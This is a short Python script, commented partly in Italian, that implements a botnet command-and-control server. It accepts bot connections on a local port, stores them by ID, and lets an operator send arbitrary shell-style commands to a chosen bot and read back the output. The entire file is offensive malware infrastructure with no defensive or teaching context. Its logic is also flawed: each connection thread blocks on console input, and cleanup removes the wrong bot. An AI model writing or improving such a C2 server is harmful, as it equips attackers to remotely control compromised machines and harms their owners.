import socket, threading

HOST = '127.0.0.1'  # Indirizzo su cui il server ascolta le connessioni
PORT = 1234
bots = {}  # Dizionario per memorizzare le connessioni dei bot

def handle_bot_connection(bot_socket):
    bot_id = bot_socket.recv(1024).decode()
    bots[bot_id] = bot_socket

    print(f"Bot {bot_id} connected to the C2 server.")

    while True:
        command = input("Enter command to send to a bot (enter 'quit' to exit): ")

        if command == "quit":
            break
        else:
            bot_id = input("Enter bot ID to send the command to: ")
            if bot_id in bots:
                bots[bot_id].sendall(command.encode())
                output = bots[bot_id].recv(1024)
                print(f"Output from bot {bot_id}: {output.decode()}")
            else:
                print("Invalid bot ID. Please enter a valid ID.")

    bot_socket.close()
    del bots[bot_id]
    print(f"Bot {bot_id} disconnected from the C2 server.")

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((HOST, PORT))
        server_socket.listen()

        print(f"C2 server running on {HOST}:{PORT}")

        while True:
            client_socket, client_address = server_socket.accept()
            thread = threading.Thread(target=handle_bot_connection, args=(client_socket,))
            thread.start()

if __name__ == "__main__":
    main()
